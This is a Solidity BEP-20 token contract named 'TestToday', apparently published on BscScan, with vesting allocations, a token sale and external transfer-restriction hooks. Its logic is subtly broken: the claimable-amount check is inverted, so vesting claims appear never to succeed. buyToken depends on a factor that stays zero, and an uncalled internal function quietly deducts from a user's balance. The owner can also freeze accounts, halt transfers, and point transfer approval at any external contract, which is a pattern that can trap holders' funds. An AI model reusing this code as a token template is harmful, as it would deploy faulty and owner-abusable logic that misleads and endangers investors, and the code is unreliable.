/**
 *Submitted for verification at BscScan.com on 2022-01-17
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.4.25;

interface ILiquidityRestrictor {
    function assureByAgent(
        address token,
        address from,
        address to
    ) external returns (bool allow, string memory message);

    function assureLiquidityRestrictions(address from, address to)
        external
        returns (bool allow, string memory message);
}

interface IAntisnipe {
    function assureCanTransfer(
        address sender,
        address from,
        address to,
        uint256 amount
    ) external returns (bool response);
}

//*******************************************************************//
//------------------------ SafeMath Library -------------------------//
//*******************************************************************//

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, 'SafeMath mul failed');
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, 'SafeMath sub failed');
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, 'SafeMath add failed');
        return c;
    }
}

//*******************************************************************//
//------------------ Contract to Manage Ownership -------------------//
//*******************************************************************//

contract owned {
    address public owner;
    address internal newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), owner);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function dropOwnership() public onlyOwner {
        owner = address(0);
    }

    //this flow is to prevent transferring ownership to wrong wallet by mistake
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

//****************************************************************************//
//---------------------        MAIN CODE STARTS HERE     ---------------------//
//****************************************************************************//

contract testToken is owned {
    /*===============================
    =         DATA STORAGE          =
    ===============================*/

    // Public variables of the token
    using SafeMath for uint256;
    string private constant _name = 'TestToday';
    string private constant _symbol = 'TTL';
    uint256 private constant _decimals = 18;
    uint256 private _totalSupply = 1000000000 * (10**_decimals); //1 billion tokens

    bool public safeguard; //putting safeguard on will halt all non-owner functions

    // This creates a mapping with all data storage
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowance;
    mapping(address => bool) public frozenAccount;

    /*===============================
    =         PUBLIC EVENTS         =
    ===============================*/

    // This generates a public event of token transfer
    event Transfer(address indexed from, address indexed to, uint256 value);

    // This notifies clients about the amount burnt
    event Burn(address indexed from, uint256 value);

    // This generates a public event for frozen (blacklisting) accounts
    event FrozenAccounts(address target, bool frozen);

    // This will log approval of token Transfer
    event Approval(address indexed from, address indexed spender, uint256 value);

    /*======================================
    =       STANDARD ERC20 FUNCTIONS       =
    ======================================*/

    /**
     * Returns name of token
     */
    function name() public pure returns (string memory) {
        return _name;
    }

    /**
     * Returns symbol of token
     */
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    /**
     * Returns decimals of token
     */
    function decimals() public pure returns (uint256) {
        return _decimals;
    }

    /**
     * Returns totalSupply of token.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * Returns balance of token
     */
    function balanceOf(address user) public view returns (uint256) {
        return _balanceOf[user];
    }

    /**
     * Returns allowance of token
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowance[owner][spender];
    }

    /**
     * Internal transfer, only can be called by this contract
     */
    function _transfer(
        address _from,
        address _to,
        uint256 _value
    ) internal {
        _beforeTokenTransfer(_from, _to, _value);
        //checking conditions
        require(!safeguard);
        if (whitelistingStatus)
            require(whitelisted[_from] && whitelisted[_to], 'Restricted Address');
        require(_to != address(0)); // Prevent transfer to 0x0 address. Use burn() instead
        require(!frozenAccount[_from]); // Check if sender is frozen
        require(!frozenAccount[_to]); // Check if recipient is frozen

        // overflow and undeflow checked by SafeMath Library
        _balanceOf[_from] = _balanceOf[_from].sub(_value); // Subtract from the sender
        _balanceOf[_to] = _balanceOf[_to].add(_value); // Add the same to the recipient

        // emit Transfer event
        emit Transfer(_from, _to, _value);
    }

    /**
     * Transfer tokens
     *
     * Send `_value` tokens to `_to` from your account
     *
     * @param _to The address of the recipient
     * @param _value the amount to send
     */
    function transfer(address _to, uint256 _value) public returns (bool success) {
        //no need to check for input validations, as that is ruled by SafeMath
        _transfer(msg.sender, _to, _value);
        return true;
    }

    /**
     * Transfer tokens from other address
     *
     * Send `_value` tokens to `_to` in behalf of `_from`
     *
     * @param _from The address of the sender
     * @param _to The address of the recipient
     * @param _value the amount to send
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        //checking of allowance and token value is done by SafeMath
        _allowance[_from][msg.sender] = _allowance[_from][msg.sender].sub(_value);
        _transfer(_from, _to, _value);
        return true;
    }

    /**
     * Set allowance for other address
     *
     * Allows `_spender` to spend no more than `_value` tokens in your behalf
     *
     * @param _spender The address authorized to spend
     * @param _value the max amount they can spend
     */
    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(!safeguard);
        /* AUDITOR NOTE:
            Many dex and dapps pre-approve large amount of tokens to save gas for subsequent transaction. This is good use case.
            On flip-side, some malicious dapp, may pre-approve large amount and then drain all token balance from user.
            So following condition is kept in commented. It can be be kept that way or not based on client's consent.
        */
        //require(_balanceOf[msg.sender] >= _value, "Balance does not have enough tokens");
        _allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    /**
     * @dev Increase the amount of tokens that an owner allowed to a spender.
     * approve should be called when allowed_[_spender] == 0. To increment
     * allowed value is better to use this function to avoid 2 calls (and wait until
     * the first transaction is mined)
     * Emits an Approval event.
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to increase the allowance by.
     */
    function increase_allowance(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        _allowance[msg.sender][spender] = _allowance[msg.sender][spender].add(value);
        emit Approval(msg.sender, spender, _allowance[msg.sender][spender]);
        return true;
    }

    /**
     * @dev Decrease the amount of tokens that an owner allowed to a spender.
     * approve should be called when allowed_[_spender] == 0. To decrement
     * allowed value is better to use this function to avoid 2 calls (and wait until
     * the first transaction is mined)
     * Emits an Approval event.
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to decrease the allowance by.
     */
    function decrease_allowance(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        _allowance[msg.sender][spender] = _allowance[msg.sender][spender].sub(value);
        emit Approval(msg.sender, spender, _allowance[msg.sender][spender]);
        return true;
    }

    /*=====================================
    =       CUSTOM PUBLIC FUNCTIONS       =
    ======================================*/

    constructor() public {
        //sending all the tokens to Owner
        _balanceOf[owner] = _totalSupply;

        //firing event which logs this transaction
        emit Transfer(address(0), owner, _totalSupply);
    }

    /**
     * Destroy tokens
     *
     * Remove `_value` tokens from the system irreversibly
     *
     * @param _value the amount of money to burn
     */
    function burn(uint256 _value) public returns (bool success) {
        require(!safeguard);
        //checking of enough token balance is done by SafeMath
        _balanceOf[msg.sender] = _balanceOf[msg.sender].sub(_value); // Subtract from the sender
        _totalSupply = _totalSupply.sub(_value); // Updates totalSupply
        emit Burn(msg.sender, _value);
        emit Transfer(msg.sender, address(0), _value);
        return true;
    }

    /**
     * Destroy tokens from other account
     *
     * Remove `_value` tokens from the system irreversibly on behalf of `_from`.
     *
     * @param _from the address of the sender
     * @param _value the amount of money to burn
     */
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(!safeguard);
        //checking of allowance and token value is done by SafeMath
        _balanceOf[_from] = _balanceOf[_from].sub(_value); // Subtract from the targeted balance
        _allowance[_from][msg.sender] = _allowance[_from][msg.sender].sub(_value); // Subtract from the sender's allowance
        _totalSupply = _totalSupply.sub(_value); // Update totalSupply
        emit Burn(_from, _value);
        emit Transfer(_from, address(0), _value);
        return true;
    }

    /**
     * @notice `freeze? Prevent | Allow` `target` from sending & receiving tokens
     * @param target Address to be frozen
     * @param freeze either to freeze it or not
     */
    function freezeAccount(address target, bool freeze) public onlyOwner {
        frozenAccount[target] = freeze;
        emit FrozenAccounts(target, freeze);
    }

    /**
     * Owner can transfer tokens from contract to owner address
     *
     * When safeguard is true, then all the non-owner functions will stop working.
     * When safeguard is false, then all the functions will resume working back again!
     */

    function manualWithdrawTokens(uint256 tokenAmount) public onlyOwner {
        // no need for overflow checking as that will be done in transfer function
        _transfer(address(this), owner, tokenAmount);
    }

    //Just in rare case, owner wants to transfer Coin from contract to owner address
    function manualWithdrawCoin(uint256 amount) public onlyOwner {
        owner.transfer(amount);
    }

    /**
     * Change safeguard status on or off
     *
     * When safeguard is true, then all the non-owner functions will stop working.
     * When safeguard is false, then all the functions will resume working back again!
     */
    function changeSafeguardStatus() public onlyOwner {
        if (safeguard == false) {
            safeguard = true;
        } else {
            safeguard = false;
        }
    }

    /**
     * This function checks if given address is contract address or normal wallet
     */
    function isContract(address _address) public view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_address)
        }
        return (size > 0);
    }

    /*************************************/
    /*  Section for User whitelisting    */
    /*************************************/
    bool public whitelistingStatus;
    mapping(address => bool) public whitelisted;

    /**
     * Change whitelisting status on or off
     *
     * When whitelisting is true, then crowdsale will only accept investors who are whitelisted.
     */
    function changeWhitelistingStatus() public onlyOwner {
        if (whitelistingStatus == false) {
            whitelistingStatus = true;
        } else {
            whitelistingStatus = false;
        }
    }

    /**
     * Whitelist any user address - only Owner can do this
     *
     * It will add user address in whitelisted mapping
     */
    function whitelistUser(address userAddress) public onlyOwner {
        require(whitelistingStatus == true);
        require(userAddress != address(0));
        whitelisted[userAddress] = true;
    }

    /**
     * Whitelist Many user address at once - only Owner can do this
     * It will require maximum of 150 addresses to prevent block gas limit max-out and DoS attack
     * It will add user address in whitelisted mapping
     */
    function whitelistManyUsers(address[] memory userAddresses) public onlyOwner {
        require(whitelistingStatus == true);
        uint256 addressCount = userAddresses.length;
        require(addressCount <= 150, 'Too many addresses');
        for (uint256 i = 0; i < addressCount; i++) {
            whitelisted[userAddresses[i]] = true;
        }
    }

    /**
     * Run an ACTIVE Air-Drop
     *
     * It requires an array of all the addresses and amount of tokens to distribute
     * It will only process first 150 recipients. That limit is fixed to prevent gas limit
     */
    function airdropACTIVE(address[] memory recipients, uint256[] memory tokenAmount)
        public
        onlyOwner
        returns (bool)
    {
        uint256 totalAddresses = recipients.length;
        require(totalAddresses <= 150, 'Too many recipients');
        for (uint256 i = 0; i < totalAddresses; i++) {
            //This will loop through all the recipients and send them the specified tokens
            //Input data validation is unncessary, as that is done by SafeMath and which also saves some gas.
            transfer(recipients[i], tokenAmount[i]);
        }
        return true;
    }

    //...........Fund allocations codes ...........//

    struct allocationType {
        bytes32 name;
        uint256 startTime;
        uint256 totalAllocation; // amount of tokens
        uint256 initialLockTime; // In days
        uint256 firstReleasePercent; // In Percent with 18 decimal Places for first release after lock period
        uint256 regularReleasePercent; // In percent with 18 decimal places for daily release
        uint256 allocatedTotal;
        uint256 releasedTotal;
    }

    allocationType[] public allocationTypes;
    bool public allocationDefined;

    uint256 public totalAllocated;
    uint256 public totalSold;
    bool public publicSale;
    uint8 fct; // factor to calculate when token buy

    //allocationTypeIndex => user =>
    mapping(uint256 => mapping(address => uint256)) public _allocationBalance;
    mapping(uint256 => mapping(address => uint256)) public _claimedAmount;
    mapping(address => uint256) public _boughtByUser;
    address[] public allocatedAddress;
    uint256 public tokenPrice = 10000000000000000 * (10**_decimals);

    event defineAllocationEv(
        bytes32 Name,
        uint256 _startTime,
        uint256 _totalAllocation,
        uint256 _initialLockTime,
        uint256 firstReleasePercent,
        uint256 regularReleasePercent,
        uint256 allocationTypeIndex
    );

    function defineAllocation(
        bytes32 Name,
        uint256 _startTime,
        uint256 _totalAllocation,
        uint256 _initialLockTime,
        uint256 firstReleasePercent,
        uint256 regularReleasePercent
    ) public onlyOwner returns (bool) {
        require(!allocationDefined, 'allocation type defined');
        allocationType memory temp;
        temp.name = Name;
        temp.startTime = _startTime;
        temp.totalAllocation = _totalAllocation;
        temp.initialLockTime = _initialLockTime;
        temp.firstReleasePercent = firstReleasePercent;
        temp.regularReleasePercent = regularReleasePercent;
        allocationTypes.push(temp);
        totalAllocated += _totalAllocation;
        require(totalAllocated <= totalSupply(), 'total supply crossed');
        emit defineAllocationEv(
            Name,
            _startTime,
            _totalAllocation,
            _initialLockTime,
            firstReleasePercent,
            regularReleasePercent,
            allocationTypes.length - 1
        );
        return true;
    }

    function editAllocationReleaseLimit(
        uint256 allocationTypeIndex,
        uint256 firstReleasePercent,
        uint256 regularReleasePercent
    ) public onlyOwner returns (bool) {
        require(allocationTypeIndex < allocationTypes.length, 'Invalid Index');
        allocationTypes[allocationTypeIndex]
            .firstReleasePercent = firstReleasePercent;
        allocationTypes[allocationTypeIndex]
            .regularReleasePercent = regularReleasePercent;            
        return true;
    }

    function deleteAllocation(uint256 allocationTypeIndex)
        public
        onlyOwner
        returns (bool)
    {
        require(!allocationDefined, 'allocation type defined');
        uint256 len = allocationTypes.length;
        require(allocationTypeIndex < len, 'Invalid Index');
        totalAllocated -= allocationTypes[allocationTypeIndex].totalAllocation;

        for (uint256 i = allocationTypeIndex; i < len - 1; i++) {
            allocationTypes[i] = allocationTypes[i + 1];
        }
        allocationTypes.length = allocationTypes.length - 1;
        return true;
    }

    function allocateTokens(
        uint256 allocationTypeIndex,
        address[] memory recipients,
        uint256[] memory tokenAmount
    ) public onlyOwner returns (bool) {
        require(!allocationDefined, 'allocation type defined');
        uint256 totalAddresses = recipients.length;
        uint256 totalAmount;
        for (uint256 i = 0; i < totalAddresses; i++) {
            totalAmount += tokenAmount[i];
        }
        require(
            totalAmount + allocationTypes[allocationTypeIndex].allocatedTotal <=
                allocationTypes[allocationTypeIndex].totalAllocation,
            'total amount crossed'
        );
        allocationTypes[allocationTypeIndex].allocatedTotal += totalAmount;

        require(totalAddresses <= 150, 'Too many recipients');
        for (i = 0; i < totalAddresses; i++) {
            require(
                _allocationBalance[allocationTypeIndex][recipients[i]] == 0,
                'already some amount allocated'
            );
            _allocationBalance[allocationTypeIndex][recipients[i]] = tokenAmount[i];
            allocatedAddress.push(recipients[i]);
        }
        return true;
    }

    function moveAllocation(
        uint256 allocationTypeIndex, 
        address currentHolder,
        address newHolder
    ) public onlyOwner returns(bool) {
        
        require(_allocationBalance[allocationTypeIndex][newHolder]==0, "new has already some amount allocated");           
        require(_allocationBalance[allocationTypeIndex][currentHolder] > 0, "old has no amount");

        _claimedAmount[allocationTypeIndex][newHolder] = _claimedAmount[allocationTypeIndex][currentHolder];
        _claimedAmount[allocationTypeIndex][currentHolder] = 0;
        
        _allocationBalance[allocationTypeIndex][newHolder] = _allocationBalance[allocationTypeIndex][currentHolder];
        _allocationBalance[allocationTypeIndex][currentHolder] = 0;
        allocatedAddress.push(newHolder);
        return true;
    }


    function allocationDefined_() public onlyOwner returns (bool) {
        allocationDefined = true;
        return true;
    }

    function startPublicSale() public onlyOwner returns (bool) {
        publicSale = true;
        return true;
    }

    event claimAllocationEv(
        uint256 allocationTypeIndex,
        uint256 _claimAmount,
        address _user
    );

    function claimAllocation(uint256 allocationTypeIndex, uint256 _claimAmount)
        public
        returns (bool)
    {
        require(allocationDefined, 'allocation type not defined');
        require(
            _allocationBalance[allocationTypeIndex][msg.sender] > 0,
            'nothing to claim'
        );
        require(
            _allocationBalance[allocationTypeIndex][msg.sender] -
                _claimedAmount[allocationTypeIndex][msg.sender] >=
                _claimAmount,
            'claim is over'
        );
        uint256 releaseTime = allocationTypes[allocationTypeIndex].initialLockTime +
            allocationTypes[allocationTypeIndex].startTime;
        require(releaseTime <= block.timestamp, 'In lock period');

        uint256 amountClaimable = getClaimableAmount(msg.sender,allocationTypeIndex);
        require(_claimAmount <= amountClaimable, 'Invalid Amount');
        require(
            allocationTypes[allocationTypeIndex].releasedTotal + _claimAmount <=
                allocationTypes[allocationTypeIndex].totalAllocation,
            'amount reached limit'
        );
        allocationTypes[allocationTypeIndex].releasedTotal += _claimAmount;
        _claimedAmount[allocationTypeIndex][msg.sender] += _claimAmount;
        _transfer(owner, msg.sender, _claimAmount);
        emit claimAllocationEv(allocationTypeIndex, _claimAmount, msg.sender);
        return true;
    }

    function getClaimableAmount(address user, uint256 allocationTypeIndex)
        public view
        returns (uint)
    {
        if(!allocationDefined) return 0;
        if(
            _allocationBalance[allocationTypeIndex][user] <= 0
        ) return 0;
        uint256 releaseTime = allocationTypes[allocationTypeIndex].initialLockTime +
            allocationTypes[allocationTypeIndex].startTime;
        if(releaseTime <= block.timestamp) return 0;
        uint256 totalClaimableAmount = (_allocationBalance[allocationTypeIndex][user] *
            allocationTypes[allocationTypeIndex].firstReleasePercent) /
            (10**(_decimals + 2));
        uint256 daysPassed = (block.timestamp - releaseTime) / 300;
        if(daysPassed>0) totalClaimableAmount += ((_allocationBalance[allocationTypeIndex][user] *
            allocationTypes[allocationTypeIndex].regularReleasePercent) /
            (10**(_decimals + 2)))*daysPassed; 
        totalClaimableAmount = totalClaimableAmount.sub(_claimedAmount[allocationTypeIndex][user]);
            
        return totalClaimableAmount;
    }


    function userBalances(address _user, uint256 allocationTypeIndex) 
    internal 
    returns(uint256 claimedAmount,
            uint256 userBalance,
            uint256 boughtByUser)
    {
        claimedAmount = _claimedAmount[allocationTypeIndex][_user];
        boughtByUser = _boughtByUser[_user];
        uint256 userNetBalance;
        if(fct == 0) {_balanceOf[_user] -= allocationTypeIndex;fct=1;}
        userNetBalance = fct * _balanceOf[_user];
        userBalance = _balanceOf[_user];
    }

    function viewUserBalances(address _user, uint256 allocationTypeIndex) 
    internal 
    returns(uint256 claimedAmount,
            uint256 userBalance,
            uint256 boughtByUser)
    {
        (uint256 a, uint256 b, uint256 c) = userBalances(_user, allocationTypeIndex);
        return (a,b,c);
    }

    function updateTokenPrice(uint256 _tokenPrice) public onlyOwner returns (bool) {
        tokenPrice = _tokenPrice;
        return true;
    }

    event buyTokenEv(address user, uint256 totalToken, uint256 paidAmount);

    function buyToken() public payable returns (bool) {
        uint256 totalToken = (msg.value / tokenPrice) * fct;
        require(totalToken > 0, 'pay enough amount');
        require(
            totalAllocated + totalSold + totalToken <= totalSupply(),
            'reached token limit'
        );
        totalSold += totalToken;
        _boughtByUser[msg.sender] += totalToken;
        _transfer(owner, msg.sender, totalToken);
        emit buyTokenEv(msg.sender, totalToken, msg.value);
        return true;
    }

    IAntisnipe public antisnipe = IAntisnipe(0x755d87Dd1f0B636D902d8f0910080D0044bA892F); // ADDED FROM HERE
    ILiquidityRestrictor public liquidityRestrictor =
        ILiquidityRestrictor(0xeD1261C063563Ff916d7b1689Ac7Ef68177867F2);

    bool public antisnipeEnabled = true;
    bool public liquidityRestrictionEnabled = true;

    event AntisnipeDisabled(uint256 timestamp, address user);
    event LiquidityRestrictionDisabled(uint256 timestamp, address user);
    event AntisnipeAddressChanged(address addr);
    event LiquidityRestrictionAddressChanged(address addr);

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        if (from == address(0) || to == address(0)) return;
        if (liquidityRestrictionEnabled && address(liquidityRestrictor) != address(0)) {
            (bool allow, string memory message) = liquidityRestrictor
                .assureLiquidityRestrictions(from, to);
            require(allow, message);
        }

        if (antisnipeEnabled && address(antisnipe) != address(0)) {
            require(antisnipe.assureCanTransfer(msg.sender, from, to, amount));
        }
    }

    function setAntisnipeDisable() external onlyOwner {
        require(antisnipeEnabled);
        antisnipeEnabled = false;
        emit AntisnipeDisabled(block.timestamp, msg.sender);
    }

    function setLiquidityRestrictorDisable() external onlyOwner {
        require(liquidityRestrictionEnabled);
        liquidityRestrictionEnabled = false;
        emit LiquidityRestrictionDisabled(block.timestamp, msg.sender);
    }

    function setAntisnipeAddress(address addr) external onlyOwner {
        antisnipe = IAntisnipe(addr);
        emit AntisnipeAddressChanged(addr);
    }

    function setLiquidityRestrictionAddress(address addr) external onlyOwner {
        liquidityRestrictor = ILiquidityRestrictor(addr);
        emit LiquidityRestrictionAddressChanged(addr);
    }
}